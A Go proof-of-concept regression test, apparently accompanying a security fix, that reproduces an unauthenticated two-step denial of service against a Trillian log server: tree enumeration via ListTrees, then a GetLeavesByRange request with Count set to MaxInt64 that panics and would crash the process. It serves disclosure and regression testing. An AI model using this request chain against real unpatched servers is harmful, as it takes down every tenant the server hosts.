// Copyright 2026 Google LLC. All Rights Reserved.
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

// Package poc demonstrates, end to end, an unauthenticated denial-of-service
// chain against a Trillian log server:
//
//  1. TrillianAdmin.ListTrees carries no request-level authorization
//     (server/admin/admin_server.go, server/interceptor/interceptor.go), so
//     any client that can open a connection can enumerate every tree's ID,
//     type and state for free -- including PREORDERED_LOG trees.
//
//  2. TrillianLog.GetLeavesByRange does not bound `Count` for
//     PREORDERED_LOG trees (storage/{mysql,postgresql,crdb}/log_storage.go).
//     A huge attacker-supplied Count reaches
//     `make([]*trillian.LogLeaf, 0, count)` unclamped, which panics
//     ("makeslice: cap out of range") before a single row is read. No
//     interceptor in the stack recovers panics, so the panic crashes the
//     whole process -- every tree/tenant hosted by that server goes down,
//     not just the targeted one.
//
// Chained together: an attacker with zero credentials and zero prior
// knowledge of any tree ID can discover a target and crash the server with
// two RPCs. Tree IDs are otherwise infeasible to guess (crypto/rand over the
// full int64 range, see storage/tree_id.go), so step 1 is what turns step 2
// from "needs insider knowledge" into "fully unauthenticated, any time".
//
// This test drives the real production server code (server/admin.Server,
// server/TrillianLogRPCServer) through the real production interceptor
// (server/interceptor.TrillianInterceptor) with a bare, unauthenticated
// context -- no mocks stand in for the vulnerable logic. It uses the
// in-memory storage backend purely so the PoC is self-contained and needs no
// external database. storage/mysql, storage/postgresql and storage/crdb
// contained the identical unbounded-count bug in getLeavesByRangeInternal
// (same code shape, same fix applied there); see
// storage/memory/log_storage_dos_test.go for a storage-only repro that
// needs no server wiring at all.
package poc

import (
	"context"
	"testing"
	"time"

	"github.com/google/trillian"
	"github.com/google/trillian/extension"
	"github.com/google/trillian/quota"
	"github.com/google/trillian/server"
	"github.com/google/trillian/server/admin"
	"github.com/google/trillian/server/interceptor"
	"github.com/google/trillian/storage"
	_ "github.com/google/trillian/storage/memory" // registers the "memory" storage provider
	"github.com/google/trillian/storage/testonly"
	"github.com/google/trillian/types"
	"github.com/google/trillian/util/clock"
	"google.golang.org/grpc"
)

// seedActiveLog simulates a real, already-operating log deployment: an
// operator has created a PREORDERED_LOG tree and it has already published
// entries (TreeSize > 0). None of this setup is available to the attacker --
// it stands in for "any PREORDERED_LOG tree that already exists in
// production", which is the only precondition the real attack needs.
func seedActiveLog(t *testing.T, reg extension.Registry, treeSize uint64) *trillian.Tree {
	t.Helper()
	ctx := context.Background()

	tree, err := storage.CreateTree(ctx, reg.AdminStorage, testonly.PreorderedLogTree)
	if err != nil {
		t.Fatalf("CreateTree: %v", err)
	}

	root, err := (&types.LogRootV1{
		TreeSize:       treeSize,
		RootHash:       make([]byte, 32),
		TimestampNanos: uint64(time.Now().UnixNano()),
	}).MarshalBinary()
	if err != nil {
		t.Fatalf("MarshalBinary: %v", err)
	}
	err = reg.LogStorage.ReadWriteTransaction(ctx, tree, func(ctx context.Context, tx storage.LogTreeTX) error {
		return tx.StoreSignedLogRoot(ctx, &trillian.SignedLogRoot{LogRoot: root})
	})
	if err != nil {
		t.Fatalf("seed StoreSignedLogRoot: %v", err)
	}
	return tree
}

// TestUnauthenticatedEnumerationThenCrash reproduces the full chain against
// real production server + interceptor code with a bare, credential-free
// context.Background() throughout -- exactly what an unauthenticated
// network attacker would send.
func TestUnauthenticatedEnumerationThenCrash(t *testing.T) {
	sp, err := storage.NewProvider("memory", nil)
	if err != nil {
		t.Fatalf("NewProvider: %v", err)
	}
	reg := extension.Registry{
		AdminStorage: sp.AdminStorage(),
		LogStorage:   sp.LogStorage(),
	}

	// --- Operator setup (not part of the attack) ---
	victimTree := seedActiveLog(t, reg, 10)

	// --- Production server + interceptor wiring, exactly as cmd/trillian_log_server does ---
	adminSrv := admin.New(reg, nil)
	logSrv := server.NewTrillianLogRPCServer(reg, clock.System)
	// quota.Noop() is the documented, commonly-deployed --quota_system=noop
	// configuration; it imposes no capacity limit (quota/noop.go), so it
	// does not stand between the attacker and the crash.
	intc := interceptor.New(reg.AdminStorage, quota.Noop(), false /* quotaDryRun */, nil)

	attacker := context.Background() // zero credentials, zero metadata

	// --- Attack step 1: unauthenticated enumeration ---
	listInfo := &grpc.UnaryServerInfo{FullMethod: "/trillian.TrillianAdmin/ListTrees"}
	listHandler := func(ctx context.Context, req interface{}) (interface{}, error) {
		return adminSrv.ListTrees(ctx, req.(*trillian.ListTreesRequest))
	}
	respIface, err := intc.UnaryInterceptor(attacker, &trillian.ListTreesRequest{}, listInfo, listHandler)
	if err != nil {
		t.Fatalf("unauthenticated ListTrees was rejected (expected it to succeed, proving the bug is patched/mitigated elsewhere): %v", err)
	}
	resp := respIface.(*trillian.ListTreesResponse)

	var discoveredID int64
	for _, tr := range resp.Tree {
		if tr.TreeId == victimTree.TreeId {
			discoveredID = tr.TreeId
		}
	}
	if discoveredID == 0 {
		t.Fatalf("attacker did not discover the victim tree via unauthenticated ListTrees; got %d trees", len(resp.Tree))
	}
	t.Logf("[attacker] discovered PREORDERED_LOG tree %d via unauthenticated ListTrees (zero credentials)", discoveredID)

	// --- Attack step 2: crash attempt using the discovered ID ---
	getInfo := &grpc.UnaryServerInfo{FullMethod: "/trillian.TrillianLog/GetLeavesByRange"}
	getHandler := func(ctx context.Context, req interface{}) (interface{}, error) {
		return logSrv.GetLeavesByRange(ctx, req.(*trillian.GetLeavesByRangeRequest))
	}
	req := &trillian.GetLeavesByRangeRequest{
		LogId:      discoveredID,
		StartIndex: 0,
		Count:      9223372036854775807, // math.MaxInt64 -- unauthenticated, unvalidated
	}

	// Pre-fix, this call panics inside make([]*trillian.LogLeaf, 0, count)
	// with "runtime error: makeslice: cap out of range" and, because no
	// interceptor in the stack recovers panics, brings down the whole
	// process along with every other tree it was serving. Post-fix, the
	// count is clamped and the call returns normally.
	func() {
		defer func() {
			if r := recover(); r != nil {
				t.Fatalf("VULNERABLE: unauthenticated GetLeavesByRange(Count=MaxInt64) on tree %d panicked: %v\n"+
					"In a real deployment (no recover() in the gRPC handler chain) this panic crashes the "+
					"entire trillian_log_server process -- a total, repeatable denial of service for every "+
					"tree/tenant it hosts, triggered by a single unauthenticated RPC.", discoveredID, r)
			}
		}()
		if _, err := intc.UnaryInterceptor(attacker, req, getInfo, getHandler); err != nil {
			t.Fatalf("GetLeavesByRange returned an error instead of the expected clamped success: %v", err)
		}
	}()

	t.Logf("[fixed] unauthenticated GetLeavesByRange(Count=MaxInt64) on tree %d returned safely -- count was clamped instead of reaching an unbounded make()", discoveredID)
}
